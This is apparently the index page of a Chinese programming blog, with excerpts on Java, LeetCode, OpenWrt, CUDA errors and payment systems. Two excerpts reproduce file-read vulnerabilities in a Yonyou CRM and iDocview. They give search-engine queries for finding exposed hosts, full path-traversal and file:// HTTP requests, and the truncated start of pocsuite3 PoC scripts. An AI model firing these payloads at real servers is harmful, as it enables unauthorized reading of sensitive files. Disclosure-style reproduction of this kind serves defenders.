<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大白的博客">
		<meta property="og:title" content="编程大白的博客" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b380f0a6c547ba75e73ed44be5ccb860/" rel="bookmark">
			漏洞复现-某友CRM系统某接口存在任意文件读取（附漏洞检测脚本）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		免责声明 文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责
漏洞描述 某友CRM系统是一款综合性的客户关系管理软件，旨在帮助企业建立和维护与客户之间的良好关系。它提供了全面的功能，包括销售管理、市场营销、客户服务和分析报告等。该系统支持多种行业和企业规模，并具有灵活可定制的特点，可以根据企业的需求进行个性化配置。该CRM系统软件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感文件。
hunter语法 app.name="用友 CRM" poc加检测 GET /pub/help2.php?key=/../../apache/php.ini HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=kq0qq7g3pfmkbou067ksc6uf85 Upgrade-Insecure-Requests: 1 poc脚本 脚本用的pocsuite框架
# _*_ coding:utf-8 _*_ # @Time : 2023/12/18 # @Author: 炼金术师诸葛亮 from pocsuite3.api import Output, POCBase, register_poc, requests, logger from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.api import REVERSE_PAYLOAD, random_str class yongyouu8_CRM_fileread(POCBase): pocDesc = '''用友CRM系统某接口存在任意文件读取''' author = '炼金术师诸葛亮' createDate = '2023-12-18' name = '用友CRM系统某接口存在任意文件读取' def _verify(self): result = {} url = self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b380f0a6c547ba75e73ed44be5ccb860/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e38ac6934243a22adba94f5b54d452b1/" rel="bookmark">
			pdmaner从pg数据库导入表结构，无法筛选schema的问题处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pdmaner从pg数据库导入表结构，无法筛选schema的问题处理 一、问题描述二、问题解决2.1.后端工程搭建并修复问题2.1.1 找到问题类2.1.2 调整问题代码2.2 替换原始程序2.2.1 打包2.2.2 替换 一、问题描述 如图，不同schame下同名的表全部显示，我使用的版本是4.7.0。
一开始尝试使用currentSchema，但无效。
jdbc:postgresql://ip:端口/数据库?currentSchema=xxschema 后来找到官方仓库，检索发现已有人提出过问题。
官方仓库地址: https://gitee.com/robergroup/pdmaner
按该回答使用此配置也不生效，实际未修复此问题。
jdbc:postgresql://IP地址:端口号/数据库名?metaFromSQL=1&amp;schemaOwner=数据库名 二、问题解决 2.1.后端工程搭建并修复问题 下载地址: https://gitee.com/robergroup/chiner-java.git
2.1.1 找到问题类 DBDialectPostgreSQLByQuery.java
2.1.2 调整问题代码 新增红框中的一行代码，如下
" join pg_namespace e on e.nspname = tb.table_schema and e.oid = c.relnamespace"+ //筛选schema 解决字段重复问题
" join pg_namespace e on e.nspname = col.table_schema and e.oid = c.relnamespace\n "+ 2.2 替换原始程序 2.2.1 打包 执行命令
mvn package -DskipTests 2.2.2 替换 进入安装目录
PDManer-win_v4.7.0\win-ia32-unpacked\resources\app.asar.unpacked\build\jar 将新编译的jar替换该目录文件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5caf33c845b996c4694bdfd8d5e927aa/" rel="bookmark">
			系统设计——系统安全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HTTPS 是如何工作的？ 安全超文本传输​​协议（HTTPS）是超文本传输​​协议（HTTP）的扩展。HTTPS 使用传输层安全性（TLS）传输加密数据。如果数据在网上被劫持，劫持者得到的只是二进制代码。
数据是如何加密和解密的？
步骤 1 - 客户端（浏览器）和服务器建立 TCP 连接。
第 2 步 - 客户端向服务器发送“客户端问候”。该消息包含一组必要的加密算法（密码套件）及其可以支持的最新 TLS 版本。服务器响应“server hello”，以便浏览器知道它是否可以支持算法和 TLS 版本。
然后服务器将 SSL 证书发送给客户端。证书包含公钥、主机名、到期日期等。客户端验证证书。
步骤 3 - 验证 SSL 证书后，客户端生成会话密钥并使用公钥对其进行加密。服务器接收加密的会话密钥并用私钥解密。
步骤 4 - 现在客户端和服务器都持有相同的会话密钥（对称加密），加密的数据将在安全的双向通道中传输。
为什么HTTPS在数据传输过程中会切换为对称加密？主要原因有两个：
安全性：非对称加密只有一种方式。这意味着如果服务器尝试将加密数据发送回客户端，任何人都可以使用公钥解密数据。
服务器资源：非对称加密增加了相当多的数学开销。它不适合长时间会话中的数据传输。
Oauth 2.0 用简单的术语解释。 OAuth 2.0 是一个强大且安全的框架，允许不同的应用程序代表用户安全地相互交互，而无需共享敏感凭据。
OAuth 涉及的实体是用户、服务器和身份提供者 (IDP)。
OAuth 令牌可以做什么？
当您使用 OAuth 时，您将获得代表您的身份和权限的 OAuth 令牌。这个令牌可以做一些重要的事情：
单点登录 (SSO)：使用 OAuth 令牌，您只需一次登录即可登录多个服务或应用程序，让生活变得更轻松、更安全。
跨系统授权：OAuth 令牌允许您跨各个系统共享您的授权或访问权限，因此您不必在各处单独登录。
访问用户配置文件：具有 OAuth 令牌的应用程序可以访问您允许的用户配置文件的某些部分，但它们不会看到所有内容。
请记住，OAuth 2.0 的目的是确保您和您的数据安全，同时让您在不同的应用程序和服务中获得无缝、无忧的在线体验。
四种主要的身份验证机制形式 SSH 密钥：
加密密钥用于安全地访问远程系统和服务器
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5caf33c845b996c4694bdfd8d5e927aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97950d2a341d2ee1deeb0c49a510448a/" rel="bookmark">
			漏洞复现-iDocview doc/upload接口存在任意文件读取漏洞（附漏洞检测脚本）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		免责声明 文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责
漏洞描述 此在线文档预览系统是一套用于在Web环境中展示和预览各种文档类型的系统，如文本文档、电子表格、演示文稿、PDF文件等。此系统doc/upload接口存在任意文件读取漏洞。
fofa语句 title="I Doc View" &amp;&amp; country="CN" poc加检测 GET /doc/upload?token=testtoken&amp;url=file:///C:/windows/win.ini&amp;name=r.txt HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 返回srcUrl，拼接url
poc脚本 脚本用的pocsuite框架
# _*_ coding:utf-8 _*_ # @Time : 2023/12/18 # @Author: 炼金术师诸葛亮 from pocsuite3.api import Output, POCBase, register_poc, requests, logger from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/97950d2a341d2ee1deeb0c49a510448a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/668ec3c52f17f3639d96ff95888dece1/" rel="bookmark">
			Java Random
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Java Random Java Random 在Java中，java.util.Random类用于生成各种随机数据。以下是一些常见的用法：
生成一个随机的boolean值： Random rand = new Random();
boolean randomBoolean = rand.nextBoolean();
生成一个随机的int值： Random rand = new Random();
int randomInt = rand.nextInt();
生成一个在指定范围内的随机int值： Random rand = new Random();
int randomInt = rand.nextInt(100); // 生成一个0-99之间的随机整数
生成一个随机的long值： Random rand = new Random();
long randomLong = rand.nextLong();
生成一个随机的float值： Random rand = new Random();
float randomFloat = rand.nextFloat();
生成一个随机的double值： Random rand = new Random();
double randomDouble = rand.nextDouble();
注意，Random对象的种子（seed）决定了随机数序列的开始。如果使用相同的种子创建两个Random对象，它们将生成相同的随机数序列。如果不指定种子，Random对象将使用当前时间的毫秒数作为种子。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c51ed374aca33f62b1ee5ea3146b03f/" rel="bookmark">
			【动态规划】【广度优先搜索】LeetCode:2617 网格图中最少访问的格子数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文涉及的基础知识点 二分查找算法合集
动态规划
题目 给你一个下标从 0 开始的 m x n 整数矩阵 grid 。你一开始的位置在 左上角 格子 (0, 0) 。
当你在格子 (i, j) 的时候，你可以移动到以下格子之一：
满足 j &lt; k &lt;= grid[i][j] + j 的格子 (i, k) （向右移动），或者
满足 i &lt; k &lt;= grid[i][j] + i 的格子 (k, j) （向下移动）。
请你返回到达 右下角 格子 (m - 1, n - 1) 需要经过的最少移动格子数，如果无法到达右下角格子，请你返回 -1 。
示例 1：
输入：grid = [[3,4,2,1],[4,2,3,1],[2,1,0,0],[2,4,0,0]]
输出：4
解释：上图展示了到达右下角格子经过的 4 个格子。
示例 2：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4c51ed374aca33f62b1ee5ea3146b03f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/332a65ad045f9201d440ef70d2ea4f44/" rel="bookmark">
			openwrt中opkg的使用，解决opkg update问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.首先要保证系统可以连接外网，也就是保证ping通百度。 2.修改/etc/opkg.config 配置文件 ，将内容改为： dest root /tmp
dest ram /tmp
dest usb /mnt/cxU
lists_dir ext /tmp/opkg-lists
option overlay_root /tmp
arch all 10
arch arm64 100
src/gz barrier_breaker_base http://archive.openwrt.org/snapshots/trunk/arm64/generic/packages/base
src/gz barrier_breaker_luci http://archive.openwrt.org/snapshots/trunk/arm64/generic/packages/luci
src/gz barrier_breaker_management http://archive.openwrt.org/snapshots/trunk/arm64/generic/packages/management
#src/gz barrier_breaker_oldpackages http://archive.openwrt.org/snapshots/trunk/arm64/generic/packages/oldpackages
src/gz barrier_breaker_packages http://archive.openwrt.org/snapshots/trunk/arm64/generic/packages/packages
src/gz barrier_breaker_routing http://archive.openwrt.org/snapshots/trunk/arm64/generic/packages/routing
src/gz barrier_breaker_telephony http://archive.openwrt.org/snapshots/trunk/arm64/generic/packages/telephony
当然以上内容中需要对应自己的系统架构，我的是arm，所以内容写的是arm64的。
3.查看内核系统架构 使用uname -a命令即可查看
4.选择适合自己版本及架构的网址 https://archive.openwrt.org/ ，在这个网址中可以根据自己架构选择，然后替换掉opkg.conf中的内容就可以了。
5.执行opkg update 保证以上情况，执行opkg update。就可以成功更新opkg的安装包列表了。
root@EC2022v:/etc# opkg update
Downloading http://downloads.openwrt.org/barrier_breaker/14.07/at91/9g20/packages/base/Packages.gz.
Updated list of available packages in /var/opkg-lists/barrier_breaker_base.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/332a65ad045f9201d440ef70d2ea4f44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96409ce4ddd1c1d8b3bdada8bc12a053/" rel="bookmark">
			Python第三方模块(库、包)安装、卸载与查看及常见问题解决（修订）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python第三方模块(库、包)安装、卸载与查看及常见问题解决（修订） 预备知识：cmd的打开与使用 cmd的打开：按下win键+R键（即先按下 键，再按下R键）或 右击“开始”－&gt;单击“运行”，弹出“运行”窗口，参见下图：
Python中的模块（Module）、包（package）和库（library）是什么意思？
Python 模块(Module)，是一个 Python 文件，以 .py 结尾，包含了 Python 对象定义和Python语句。或者说是 Python 代码的一种组织单位。
多个模块放在一个文件夹，就是一个包（package）。在早一点的 Python 版本（Python 3.3 之前）中，如果一个文件夹下有一个 __init__.py 文件，那我们就称之为包。在后来的 Python 版本（Python 3.3 开始）中，就没有这个要求了，只要是文件夹就可以当作包（package），简单地说，包由相关目录里的模块构成。
python中的库（Library）是参考其它编程语言的说法，既可以是一个模块也可以是一个包，是对模块或包的通俗的说法。
在Python中，模块分为三种：
标准模块【注1】，打开你的Python解释器目录，标准模块就在Lib文件夹下
第三方（扩展）模块【注2】，第三方模块被统一的存放在本地Python安装路径的Lib/site-packages文件夹内
自定义模块，就是我们自己写的模块了（可参见 python中的自定义模块及其使用 https://blog.csdn.net/cnds123/article/details/107087019 ）
【注1】Python将常用的实现某类功能的代码组织在一起并起名为模块，随着Python解释器安装到你的本地，称为标准模块。
【注2】需要Python做的事情实在是太多了，不可能把所有的模块都预先安装。使用Python的人们根据特定的应用场景开发出了特定用途的模块，这些模块经过Python官方审核通过，就可以被广大Python开发者使用了，这种现成的并未随着python解释器安装的模块被统称为第三方模块。第三方模块在首次使用前必须安装之。
Python模块(库、包)安装方法 在CMD中（Windows命令行窗口中），输入如下的命令：
pip install 模块(库、包)名
如安装numpy
pip install numpy
如果你的电脑上安装了多个Python版本，你可以为特定版本的Python安装模块（库、包），有多种方式：
1、在cmd中（命令行中）使用 py 启动器命令配合 -m 开关选项，为指定Python版本安装模块（库、包）：
py -X.Y -m pip install 模块(库、包)名
其中
X.Y代表Python版本，多余的部分舍弃如3.7.4，取3.7，3.8.1取3.8，3.10.5取3.10，即只取第二个点前的部分。
py 是启动器py.exe，Python启动器（Launcher）可帮助定位和执行不同版本的Python解释器。在Windows中安装Python时，默认安装Python启动器（py.exe）。
2、在命令行中先进入特定版本的Python安装路径，再使用pip install 模块(库、包)名
【查看Python安装路径方法，在cmd中使用命令
py -0p
其中0是零。查看Python安装路径几种方法 https://blog.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96409ce4ddd1c1d8b3bdada8bc12a053/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c6e211e229d348bbe7aacfb7b6383f6a/" rel="bookmark">
			产品经理学习-用户故事上
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录：
使用用户故事的原因
用户故事的使用者
创建用户故事
使用用户故事的原因 用户故事是描述需求的最好方法。为什么会有这个结论？
这不得不说起目前主流的开发方法即传统瀑布流开发方法和敏捷开发。在瀑布流开发方法论中，可以采用需求说明书的方式描述需求
敏捷开发是一种方法，是在“以人为核心驱动”的复杂系统背景下，一个具有适应性的“经验性过程控制方法”
敏捷开发在日常的软件开发中使用越来越多，因为使用需求规格说明书带来了很多尴尬
这一篇重点介绍用户故事
用户故事与需求规格说明书PRD相比有哪些不同点
用户故事的使用者 产品开发的流程是迭代1开始==》迭代1进行中==》迭代1完成==》迭代2开始==》迭代2进行中
项目负责人PO，整理需求，编写，修改‘大用户故事’项目负责人PO对“迭代后的产品”负责，随时和项目干系人、客户、团队沟通，将需求映射成大用户故事，项目未开始前，PO可以随时调整大用户故事的内容，在每一个迭代开始后，PO都会和团队一起，验收该迭代的交付项目。
业务分析师BA负责拆分迭代的用户故事，并编写验收条件，验收完成的用户故事；拆分下一个迭代的用户故事并编写验收条件
业务分析师BA和开发团队负责将迭代中的用户故事细分，开发并交付，BA将在遭遇开发团队一个迭代前，将开发团队需要的用户故事细化完成，并编写验收条件，在迭代的开始BA会召集开发团队，对此次开发的所有用户故事给予讲解，在每一个迭代结束后，BA和开发团队一起向产品负责人演示此次迭代的可交付物。
创建用户故事 什么是用户故事？ 简单来说就是：
用户故事有3个特点：①以卡片的形式描述一个事情，②简单描述完整的事情，引发讨论
③需要有确认方式（验收标准）
一个卡片写一个用户故事，内容简洁，保障了阅读的便利、方便人员之间问题的探讨。
在做项目过程中，比如APP，一个页面就是一个大用户故事，页面中的一个按钮是一个小用户故事
什么是验收标准 验收标准简称AC,帮我们补充了故事很多边界以外的信息，工作在故事卡上的所有角色需要产品经理、开发人员有共同的认知，对这个故事完成的目标达成一致，大家对完成的目标有共同的认识，交互的结果有一个明确的验收标准。
只要我们对AC的认知是一直的，就避免了开发和产品经理之间扯不清的事情；
比如“我想用手机号登录系统”这个例子来编写验收标准，开发可能有很多疑问，外国的手机号可以使用吗？还需要用户输入摩玛吗？手机号码错误提示什么信息等
验收标准可以作为QA的测试用例，但是是用”非技术“的语言写成的，“我想用手机号登录系统”这个例子来编写验收标准可能有：
给定中国大陆运营商的电话号码当用户输入号码少于或多余11位，则出现“号码错误，请重新输入”的提示给定一个11位中国大陆手机号码，当用户点击‘获取验证码’的时候，后端系统给该手机号发送一个6位的手机号给定一个正确的手机号，当手机号码是错误的，或短信发送失败，则系统忽略此手机号的后续注册步骤给点一个正确的手机号，当用户将验证码输入，并且按‘注册’按钮，验证码匹配成功后，提示用户注册成功，并登录软件。 AC验收标准的模版：
前提条件：当存在这种前提条件下，我们才会有可能发生以下的验收标准
触发条件：用户操作什么触发，系统定时触发、特定事件触发、特定时间触发
期望结果：定义期望的结果
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e003fd175d0d923b68225d958b7ec8da/" rel="bookmark">
			TEB总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Non-holonomic kinematics： 如上图可视，我们认为每两个离散位姿之间是通过一个圆弧运动的，所以这两个夹角相等，这里使用叉乘来表示等式约束
曲率约束： 速度和加速度约束： 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d7264a5b71ab6c329fd0a353b2ec4a4/" rel="bookmark">
			系统架构——支付系统设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 支付系统是现代社会不可或缺的一部分，随着电子商务和移动支付的普及，对支付系统的技术要求变得越来越高。本文将深入探讨支付系统的学习路径和其中的关键技术概念。
1. 支付系统简介 支付系统是指通过电子渠道进行货币交换的一系列软硬件设施和规则的集合。主要目标是安全、高效地完成交易。了解支付系统的发展历史和基本工作原理是学习的第一步。
2. 关键概念 支付流程： 掌握支付的基本流程，包括订单生成、支付请求、支付确认和资金结算等环节。
支付渠道： 学习不同的支付渠道，如在线支付、移动支付、银行卡支付等。了解各个渠道的特点和适用场景。
支付安全： 深入了解支付安全机制，包括数据加密、身份验证、防欺诈等技术，保障支付过程的安全性。
3. 技术栈 支付协议： 学习支付领域常见的协议，如ISO 8583、HTTP、HTTPS等，了解它们在支付中的应用。
支付网关： 掌握支付网关的概念和作用，了解如何实现支付网关以及它在整个支付流程中的角色。
金融标准： 学习与支付相关的金融标准，如PCI DSS（Payment Card Industry Data Security Standard），保障支付系统的合规性。
移动支付技术： 了解移动支付的技术原理，包括NFC技术、二维码支付等。
4. 支付系统的挑战与未来发展 随着技术的不断发展，支付系统面临着诸多挑战，包括安全性、跨境支付、合规性等。了解这些挑战，并探讨支付系统未来可能的发展方向，将帮助学习者更好地把握技术趋势。
5. 学习路径与资源 提供学习支付系统的路径建议，包括阅读相关书籍、参与在线课程、实践项目等。推荐一些优质的学习资源和社区，方便学习者深入学习和交流。
6. 信用卡为何被称为“银行最赚钱的产品”？ VISA/万事达卡如何赚钱？ 下图显示了信用卡支付流程的经济学。
1. 持卡人向商家支付 100 美元购买产品。
2. 商家从使用销量较高的信用卡中获益，需要向发卡机构和卡网络提供支付服务进行补偿。收单银行向商户收取一定费用，称为“商户折扣费”。
3 - 4. 收单银行保留 0.25 美元作为收单加价，并向开证行支付 1.75 美元作为交换费。商户折扣费应包含交换费。
交换费由卡网络设定，因为每个发卡行与每个商户协商费用的效率较低。
5. 卡网络与每家银行建立网络评估和费用，银行每月向卡网络支付其服务费用。例如，VISA 对每次刷卡收取 0.11% 的评估费，另加 0.0195 美元的使用费。
6. 持卡人向发卡银行支付服务费用。
开证行为何要赔偿？
即使持卡人未能向发卡机构付款，发卡机构也会向商户付款。发卡机构先向商户付款，然后持卡人向发卡机构付款。发行人还有其他运营成本，包括管理客户账户、提供报表、欺诈检测、风险管理、清算和结算。结算等 7. 当我们在商户刷信用卡时，VISA是如何运作的？ VISA、Mastercard 和 American Express 充当资金清算和结算的卡网络。收单银行和发卡银行可能（而且通常是）不同。如果银行要在没有中介的情况下一笔一笔地结算交易，则每家银行都必须与所有其他银行结算交易。这是相当低效的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d7264a5b71ab6c329fd0a353b2ec4a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec9b91a3ed4664cb833e6acfc5985d6a/" rel="bookmark">
			报错解决：RuntimeError:The detected CUDA version mismatches the version that was used to compile PyTorch.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错解决：RuntimeError:The detected CUDA version mismatches the version that was used to compile PyTorch. 报错解决方法：安装对应版本的CUDAconda虚拟环境中安装本地安装多版本切换 附录：可能遇到的报错报错一：GCC版本不兼容报错二：安装路径报错 报错 博主在编译安装软件时，遇到报错如下：
File "/home/XXX/miniconda3/envs/lin/lib/python3.8/site-packages/torch/utils/cpp_extension.py", line 404, in build_extensions self._check_cuda_version() File "/home/XXX/miniconda3/envs/lin/lib/python3.8/site-packages/torch/utils/cpp_extension.py", line 781, in _check_cuda_version raise RuntimeError(CUDA_MISMATCH_MESSAGE.format(cuda_str_version, torch.version.cuda)) RuntimeError: The detected CUDA version (11.3) mismatches the version that was used to compile PyTorch (10.2). Please make sure to use the same CUDA versions. 报错原因：CUDA版本和Pytorch版本不匹配。
解决方法：安装对应版本的CUDA 在Linux系统中安装cuda和cudnn一般有两种方法：
在conda虚拟环境中安装。此方法不需要sudo管理员权限，比较适合在公有的电脑或服务器上开发使用。默认安装地址在/anaconda3/envs/[$EnvName]/路径下。在官网下载deb或runfile文件进行本地安装。此方法需要sudo管理员权限，比较适合在自己的电脑或服务器上开发使用。默认安装地址在/usr/local/路径下。 注意：在大多数情况下，在conda虚拟环境中安装 cudatoolkit （第一种安装方法）是可以满足 Pytorch 等框架的使用需求的。但对于一些特殊需求，如需要为 Pytorch 框架添加 CUDA 相关的拓展时(Custom C++ and CUDA Extensions)，需要对编写的 CUDA 相关的程序进行编译等操作，则需安装完整的 Nvidia 官方提供的 CUDA Toolkit.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec9b91a3ed4664cb833e6acfc5985d6a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b10bdfe3eba8bbc9a7a91ddc6829ca97/" rel="bookmark">
			opkg update错误 wget returned 5
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、问题现象二、解决方法一三、解决方法二 前言 新烧写的WRT固件，配置好网络后可以正常访问外网，但是执行opkg update时出错，提示wget错误，此时一般是ssl没有正常安装，导致wget不支持https.
一、问题现象 Collected errors: * opkg_download: Failed to download https://mirrors.cloud.tencent.com/openwrt/releases/22.03.4/packages/aarch64_generic/base/Packages.gz, wget returned 5. * opkg_download: Failed to download https://mirrors.cloud.tencent.com/openwrt/releases/22.03.4/packages/aarch64_generic/luci/Packages.gz, wget returned 5. * opkg_download: Failed to download https://mirrors.cloud.tencent.com/openwrt/releases/22.03.4/packages/aarch64_generic/packages/Packages.gz, wget returned 5. * opkg_download: Failed to download https://mirrors.cloud.tencent.com/openwrt/releases/22.03.4/packages/aarch64_generic/routing/Packages.gz, wget returned 5. * opkg_download: Failed to download https://mirrors.cloud.tencent.com/openwrt/releases/22.03.4/packages/aarch64_generic/telephony/Packages.gz, wget returned 5. 二、解决方法一 修改opkg source, 将源地址中https修改为http.
三、解决方法二 检查是否安装wget-nossl， 卸载后，重新安装 支持ssl的wget 。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87194a3b2f71812248236b3e07fe0898/" rel="bookmark">
			vue3 报错Use // eslint-disable-next-line to ignore the next line.Use /* eslint-disable */ to ignore
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 借鉴关于vue关闭eslint校验-CSDN博客
问题
操作原理：先关闭eslint校验
操作：在vue.config.js中添加设置 lintOnSave:false
lintOnSave:false 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71df7703066f76800ae8365b5974f568/" rel="bookmark">
			【linux--进程通信之共享内存】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、共享内存的原理二、共享内存的数据结构三、共享内存使用的函数2.1ftok函数2.2shmget函数2.3shmctr函数2.4shmat函数2.5shmdt函数 四、实现进程通信 一、共享内存的原理 共享内存实际是操作系统在实际物理内存中开辟的一段内存。
共享内存实现进程间通信，是操作系统在实际物理内存开辟一块空间，一个进程在自己的页表中，将该空间和进程地址空间上的共享区的一块地址空间形成映射关系。另外一进程在页表上，将同一块物理空间和该进程地址空间上的共享区的一块地址空间形成映射关系。
当一个进程往该空间写入内容时，另外一进程访问该空间，会得到写入的值，即实现了进程间的通信。
注意：共享内存实现进程间通信是进程间通信最快的。（相比较管道共享内存不需要两次拷贝）
二、共享内存的数据结构 在系统当中可能会有大量的进程在进行通信，因此系统当中就可能存在大量的共享内存，那么操作系统必然要对其进行管理，所以共享内存除了在内存当中真正开辟空间之外，为了维护管理共享内存，系统一定要"描述"共享内存
/* Obsolete, used only for backwards compatibility and libc5 compiles */ struct shmid_ds { struct ipc_perm	shm_perm;	/* operation perms */ int	shm_segsz;	/* size of segment (bytes) *///共享内存空间大小 __kernel_time_t	shm_atime;	/* last attach time *///挂接时间 __kernel_time_t	shm_dtime;	/* last detach time *///取消挂接时间 __kernel_time_t	shm_ctime;	/* last change time *///改变时间 __kernel_ipc_pid_t	shm_cpid;	/* pid of creator */ __kernel_ipc_pid_t	shm_lpid;	/* pid of last operator */ unsigned short	shm_nattch;	/* no.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/71df7703066f76800ae8365b5974f568/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/938b8763a86a7557384e895a5da33578/" rel="bookmark">
			代码实现了一个电力系统的优化问题，包括潮流方程的建模、二阶锥约束的处理和电价优化等
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MATLAB代码：配网节点电价 DLMP 关键词：DLMP SOCP lindistflow 参考文档：《Distribution Locational Marginal Pricing (DLMP) for Congestion Management and Voltage Support》2018 SCI一区 IEEE Transactions on Power System 非完美复现
仿真平台：MATLAB+Gurobi
主要内容: 1. 考虑网损，电压，阻塞的配电网二阶锥节点电价 （DLMP)需要gurobi求解器； 2.在原本lindistflow上使用了二阶锥，精确了模型；
3。
可以轻松加东西，全网唯一
4.PDF为参考文献，并非完美复现。
1. 代码目的
该代码的目的是通过优化方法解决电力系统的运行问题，主要涉及以下方面：
电力网络建模： 通过潮流方程和二阶锥约束建立了电力系统的模型，包括线路功率、节点电压等变量。
负荷和风机出力设置： 负荷数据和风机出力百分比由用户给定，并在模型中进行了相应的设置。
